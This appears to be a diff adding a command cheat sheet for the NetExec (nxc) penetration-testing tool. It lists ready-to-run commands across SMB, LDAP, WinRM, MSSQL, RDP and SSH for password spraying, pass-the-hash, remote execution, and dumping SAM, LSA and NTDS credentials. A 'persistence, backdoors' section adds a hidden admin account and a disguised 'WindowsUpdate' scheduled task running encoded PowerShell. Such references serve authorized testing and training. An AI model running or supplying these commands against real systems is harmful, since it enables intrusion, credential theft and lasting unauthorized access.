@@ -1,0 +1,512 @@
+% nxc, smb, authentication
+
+# Test SMB authentication
+nxc smb <target> -u <username> -p <password>
+
+# Test SMB authentication with domain
+nxc smb <target> -u <username> -p <password> -d <domain>
+
+# Pass-the-hash authentication
+nxc smb <target> -u <username> -H <ntlm_hash>
+
+# Local authentication (no domain)
+nxc smb <target> -u <username> -p <password> --local-auth
+
+# Test multiple credentials
+nxc smb <target> -u <user_file> -p <pass_file> --no-bruteforce --continue-on-success
+
+# Anonymous/null session
+nxc smb <target> -u '' -p ''
+
+# Guest account
+nxc smb <target> -u guest -p ''
+
+$ target: echo "192.168.1.10"
+$ username: echo "administrator"
+$ password: echo "Password123"
+$ domain: echo "CORP"
+$ ntlm_hash: echo "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
+$ user_file: echo "users.txt"
+$ pass_file: echo "passwords.txt"
+
+
+% nxc, smb, enumeration
+
+# List all shares
+nxc smb <target> -u <username> -p <password> --shares
+
+# Enumerate domain users
+nxc smb <target> -u <username> -p <password> --users
+
+# Enumerate local users
+nxc smb <target> -u <username> -p <password> --local-users
+
+# Enumerate domain groups
+nxc smb <target> -u <username> -p <password> --groups
+
+# Enumerate local groups
+nxc smb <target> -u <username> -p <password> --local-groups
+
+# Get password policy
+nxc smb <target> -u <username> -p <password> --pass-pol
+
+# List active sessions
+nxc smb <target> -u <username> -p <password> --sessions
+
+# List available disks
+nxc smb <target> -u <username> -p <password> --disks
+
+# RID bruteforce enumeration
+nxc smb <target> -u <username> -p <password> --rid-brute
+
+# List logged on users
+nxc smb <target> -u <username> -p <password> --loggedon-users
+
+# Get domain information
+nxc smb <target> -u <username> -p <password> --users --groups --pass-pol
+
+$ target: echo "192.168.1.10"
+$ username: echo "administrator"
+$ password: echo "Password123"
+
+
+% nxc, smb, shares
+
+# Spider all shares (list all files)
+nxc smb <target> -u <username> -p <password> -M spider_plus
+
+# Spider specific share
+nxc smb <target> -u <username> -p <password> -M spider_plus -o SHARE=<share_name>
+
+# Spider with pattern matching
+nxc smb <target> -u <username> -p <password> -M spider_plus -o PATTERN=<pattern>
+
+# Download file from share
+nxc smb <target> -u <username> -p <password> --get-file <remote_path> <local_path>
+
+# Upload file to share
+nxc smb <target> -u <username> -p <password> --put-file <local_path> <remote_path>
+
+# List files in specific share
+nxc smb <target> -u <username> -p <password> -M spider_plus -o SHARE=<share_name> READ_ONLY=false
+
+$ target: echo "192.168.1.10"
+$ username: echo "administrator"
+$ password: echo "Password123"
+$ share_name: echo "C$"
+$ pattern: echo "*.xlsx"
+$ remote_path: echo "C:\\Windows\\System32\\config\\SAM"
+$ local_path: echo "/tmp/SAM"
+
+
+% nxc, smb, execution
+
+# Execute command via SMB
+nxc smb <target> -u <username> -p <password> -x <command>
+
+# Execute PowerShell command
+nxc smb <target> -u <username> -p <password> -X <ps_command>
+
+# Execute command and get output
+nxc smb <target> -u <username> -p <password> -x 'whoami /all'
+
+# Get system information
+nxc smb <target> -u <username> -p <password> -x systeminfo
+
+# List running processes
+nxc smb <target> -u <username> -p <password> -x 'tasklist /v'
+
+# Check network configuration
+nxc smb <target> -u <username> -p <password> -x 'ipconfig /all'
+
+# List local administrators
+nxc smb <target> -u <username> -p <password> -x 'net localgroup administrators'
+
+$ target: echo "192.168.1.10"
+$ username: echo "administrator"
+$ password: echo "Password123"
+$ command: echo "whoami"
+$ ps_command: echo "Get-Process"
+
+
+% nxc, smb, credentials
+
+# Dump SAM database
+nxc smb <target> -u <username> -p <password> --sam
+
+# Dump LSA secrets
+nxc smb <target> -u <username> -p <password> --lsa
+
+# Dump NTDS.dit (Domain Controller)
+nxc smb <target> -u <username> -p <password> --ntds
+
+# Dump all credentials
+nxc smb <target> -u <username> -p <password> --sam --lsa --ntds
+
+# Extract credentials with lsassy module
+nxc smb <target> -u <username> -p <password> -M lsassy
+
+# Dump credentials with nanodump
+nxc smb <target> -u <username> -p <password> -M nanodump
+
+# Extract WiFi passwords
+nxc smb <target> -u <username> -p <password> -M wifi
+
+$ target: echo "192.168.1.10"
+$ username: echo "administrator"
+$ password: echo "Password123"
+
+
+% nxc, smb, vulnerabilities
+
+# Check for MS17-010 (EternalBlue)
+nxc smb <target> -M ms17-010
+
+# Check for Zerologon (CVE-2020-1472)
+nxc smb <target> -u <username> -p <password> -M zerologon
+
+# Check for PetitPotam
+nxc smb <target> -u <username> -p <password> -M petitpotam
+
+# Check for NoPac (CVE-2021-42278/42287)
+nxc smb <target> -u <username> -p <password> -M nopac
+
+# Check for SMBGhost (CVE-2020-0796)
+nxc smb <target> -M smbghost
+
+# Check for PrintNightmare
+nxc smb <target> -u <username> -p <password> -M printnightmare
+
+$ target: echo "192.168.1.10"
+$ username: echo "administrator"
+$ password: echo "Password123"
+
+
+% nxc, ldap, enumeration
+
+# Enumerate LDAP users
+nxc ldap <target> -u <username> -p <password> -d <domain> --users
+
+# Enumerate LDAP groups
+nxc ldap <target> -u <username> -p <password> -d <domain> --groups
+
+# Get user descriptions (often contains passwords)
+nxc ldap <target> -u <username> -p <password> -d <domain> -M get-desc-users
+
+# Enumerate domain computers
+nxc ldap <target> -u <username> -p <password> -d <domain> -M machines
+
+# Enumerate domain trusts
+nxc ldap <target> -u <username> -p <password> -d <domain> -M enum_trusts
+
+# Check for ADCS (Certificate Services)
+nxc ldap <target> -u <username> -p <password> -d <domain> -M adcs
+
+# Get all user attributes
+nxc ldap <target> -u <username> -p <password> -d <domain> -M user-desc
+
+# Check LDAP signing requirements
+nxc ldap <target> -u <username> -p <password> -d <domain> -M ldap-checker
+
+# Enumerate GPOs
+nxc ldap <target> -u <username> -p <password> -d <domain> -M get-network -o ALL=true
+
+$ target: echo "192.168.1.10"
+$ username: echo "administrator"
+$ password: echo "Password123"
+$ domain: echo "CORP"
+
+
+% nxc, ldap, bloodhound
+
+# Collect BloodHound data (All)
+nxc ldap <target> -u <username> -p <password> -d <domain> -M bloodhound -o COLLECTION=All
+
+# Collect only user sessions
+nxc ldap <target> -u <username> -p <password> -d <domain> -M bloodhound -o COLLECTION=Session
+
+# Collect domain trusts
+nxc ldap <target> -u <username> -p <password> -d <domain> -M bloodhound -o COLLECTION=Trusts
+
+# Collect ACLs
+nxc ldap <target> -u <username> -p <password> -d <domain> -M bloodhound -o COLLECTION=ACL
+
+$ target: echo "192.168.1.10"
+$ username: echo "administrator"
+$ password: echo "Password123"
+$ domain: echo "CORP"
+
+
+% nxc, winrm, basic
+
+# Test WinRM authentication
+nxc winrm <target> -u <username> -p <password>
+
+# Execute command via WinRM
+nxc winrm <target> -u <username> -p <password> -x <command>
+
+# Execute PowerShell via WinRM
+nxc winrm <target> -u <username> -p <password> -X <ps_command>
+
+# Get system info via WinRM
+nxc winrm <target> -u <username> -p <password> -x systeminfo
+
+# Check user privileges
+nxc winrm <target> -u <username> -p <password> -x 'whoami /priv'
+
+# List local users
+nxc winrm <target> -u <username> -p <password> -x 'net user'
+
+# Get network configuration
+nxc winrm <target> -u <username> -p <password> -x 'ipconfig /all'
+
+$ target: echo "192.168.1.10"
+$ username: echo "administrator"
+$ password: echo "Password123"
+$ command: echo "whoami"
+$ ps_command: echo "Get-ComputerInfo"
+
+
+% nxc, mssql, basic
+
+# Test MSSQL authentication
+nxc mssql <target> -u <username> -p <password>
+
+# Execute SQL query
+nxc mssql <target> -u <username> -p <password> -q <query>
+
+# Get MSSQL version
+nxc mssql <target> -u <username> -p <password> -q 'SELECT @@version'
+
+# List databases
+nxc mssql <target> -u <username> -p <password> -q 'SELECT name FROM sys.databases'
+
+# List tables in database
+nxc mssql <target> -u <username> -p <password> -q 'SELECT * FROM <database>.INFORMATION_SCHEMA.TABLES'
+
+# Check MSSQL privileges
+nxc mssql <target> -u <username> -p <password> -M mssql_priv
+
+# Execute OS command via xp_cmdshell
+nxc mssql <target> -u <username> -p <password> -x <command>
+
+# Enable xp_cmdshell
+nxc mssql <target> -u <username> -p <password> -q "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
+
+$ target: echo "192.168.1.10"
+$ username: echo "sa"
+$ password: echo "Password123"
+$ query: echo "SELECT @@version"
+$ database: echo "master"
+$ command: echo "whoami"
+
+
+% nxc, rdp, basic
+
+# Test RDP authentication
+nxc rdp <target> -u <username> -p <password>
+
+# Check RDP with NLA
+nxc rdp <target> -u <username> -p <password> -M rdp-scanner
+
+# Take screenshot via RDP
+nxc rdp <target> -u <username> -p <password> -M rdp-screenshot
+
+$ target: echo "192.168.1.10"
+$ username: echo "administrator"
+$ password: echo "Password123"
+
+
+% nxc, ssh, basic
+
+# Test SSH authentication
+nxc ssh <target> -u <username> -p <password>
+
+# Execute command via SSH
+nxc ssh <target> -u <username> -p <password> -x <command>
+
+# SSH with private key
+nxc ssh <target> -u <username> --key-file <key_path>
+
+# Get system info via SSH
+nxc ssh <target> -u <username> -p <password> -x 'uname -a'
+
+# Check sudo privileges
+nxc ssh <target> -u <username> -p <password> -x 'sudo -l'
+
+$ target: echo "192.168.1.10"
+$ username: echo "root"
+$ password: echo "Password123"
+$ command: echo "id"
+$ key_path: echo "~/.ssh/id_rsa"
+
+
+% nxc, ftp, basic
+
+# Test FTP authentication
+nxc ftp <target> -u <username> -p <password>
+
+# Anonymous FTP login
+nxc ftp <target> -u anonymous -p ''
+
+# List FTP directory
+nxc ftp <target> -u <username> -p <password> -M ftp_ls
+
+$ target: echo "192.168.1.10"
+$ username: echo "ftpuser"
+$ password: echo "Password123"
+
+
+% nxc, scanning, network
+
+# Scan subnet for SMB
+nxc smb <subnet> -u <username> -p <password>
+
+# Scan IP range
+nxc smb <ip_range> -u <username> -p <password>
+
+# Scan from file
+nxc smb <target_file> -u <username> -p <password>
+
+# Multi-protocol scan
+nxc smb <subnet> -u <username> -p <password> && nxc winrm <subnet> -u <username> -p <password>
+
+# Find admin access across subnet
+nxc smb <subnet> -u <username> -p <password> -x whoami
+
+# Password spray across subnet
+nxc smb <subnet> -u <user_file> -p <password> --no-bruteforce --continue-on-success
+
+$ subnet: echo "192.168.1.0/24"
+$ ip_range: echo "192.168.1.1-254"
+$ target_file: echo "targets.txt"
+$ username: echo "administrator"
+$ password: echo "Password123"
+$ user_file: echo "users.txt"
+
+
+% nxc, modules, useful
+
+# List all available modules
+nxc smb -L
+
+# Get module info
+nxc smb -M <module_name> --module-info
+
+# Run module with options
+nxc smb <target> -u <username> -p <password> -M <module_name> -o <option>=<value>
+
+# Common useful modules
+nxc smb <target> -u <username> -p <password> -M enum_avproducts
+nxc smb <target> -u <username> -p <password> -M enum_dns
+nxc smb <target> -u <username> -p <password> -M enum_ca
+nxc smb <target> -u <username> -p <password> -M gpp_password
+nxc smb <target> -u <username> -p <password> -M keepass_discover
+
+$ target: echo "192.168.1.10"
+$ username: echo "administrator"
+$ password: echo "Password123"
+$ module_name: echo "lsassy"
+$ option: echo "METHOD"
+$ value: echo "1"
+
+
+% nxc, persistence, backdoors
+
+# Add local user
+nxc smb <target> -u <username> -p <password> -x 'net user <new_user> <new_pass> /add'
+
+# Add user to administrators
+nxc smb <target> -u <username> -p <password> -x 'net localgroup administrators <new_user> /add'
+
+# Create scheduled task for persistence
+nxc smb <target> -u <username> -p <password> -x 'schtasks /create /tn <task_name> /tr <task_command> /sc onstart /ru system'
+
+# Enable RDP
+nxc smb <target> -u <username> -p <password> -x 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
+
+$ target: echo "192.168.1.10"
+$ username: echo "administrator"
+$ password: echo "Password123"
+$ new_user: echo "backdoor"
+$ new_pass: echo "BackdoorPass123!"
+$ task_name: echo "WindowsUpdate"
+$ task_command: echo "powershell.exe -enc <base64>"
+
+
+% nxc, output, logging
+
+# Log output to file
+nxc smb <target> -u <username> -p <password> --log <log_file>
+
+# Export results to CSV
+nxc smb <target> -u <username> -p <password> --shares --export <csv_file>
+
+# Verbose output
+nxc smb <target> -u <username> -p <password> -v
+
+# Debug output
+nxc smb <target> -u <username> -p <password> -vv
+
+$ target: echo "192.168.1.10"
+$ username: echo "administrator"
+$ password: echo "Password123"
+$ log_file: echo "nxc_output.log"
+$ csv_file: echo "shares.csv"
+
+
+% nxc, advanced, techniques
+
+# Pass-the-hash with multiple targets
+nxc smb <subnet> -u <username> -H <ntlm_hash> --continue-on-success
+
+# Kerberos authentication
+nxc smb <target> -u <username> -p <password> -d <domain> --kerberos
+
+# Use AES key for Kerberos
+nxc smb <target> -u <username> --aesKey <aes_key> --kerberos
+
+# Relay attack preparation (list targets)
+nxc smb <subnet> -u '' -p '' --gen-relay-list <relay_targets>
+
+# Check for SMB signing
+nxc smb <subnet> --gen-relay-list smb_signing_disabled.txt
+
+# Use proxychains
+proxychains nxc smb <target> -u <username> -p <password>
+
+$ subnet: echo "192.168.1.0/24"
+$ target: echo "192.168.1.10"
+$ username: echo "administrator"
+$ ntlm_hash: echo "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
+$ domain: echo "CORP"
+$ aes_key: echo "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
+$ relay_targets: echo "relay_targets.txt"
+
+
+% nxc, post-exploitation, recon
+
+# Find domain controllers
+nxc smb <subnet> -u <username> -p <password> -M get-network
+
+# Find file servers (large shares)
+nxc smb <subnet> -u <username> -p <password> --shares | grep -i "READ,WRITE"
+
+# Search for sensitive files
+nxc smb <target> -u <username> -p <password> -M spider_plus -o PATTERN=<pattern>
+
+# Find computers with specific software
+nxc smb <subnet> -u <username> -p <password> -M enum_avproducts
+
+# Map domain structure
+nxc ldap <target> -u <username> -p <password> -d <domain> --users --groups
+
+# Find SQL servers
+nxc mssql <subnet> -u <username> -p <password>
+
+$ subnet: echo "192.168.1.0/24"
+$ target: echo "192.168.1.10"
+$ username: echo "administrator"
+$ password: echo "Password123"
+$ pattern: echo "*.kdbx|password|credential"
+$ domain: echo "CORP"
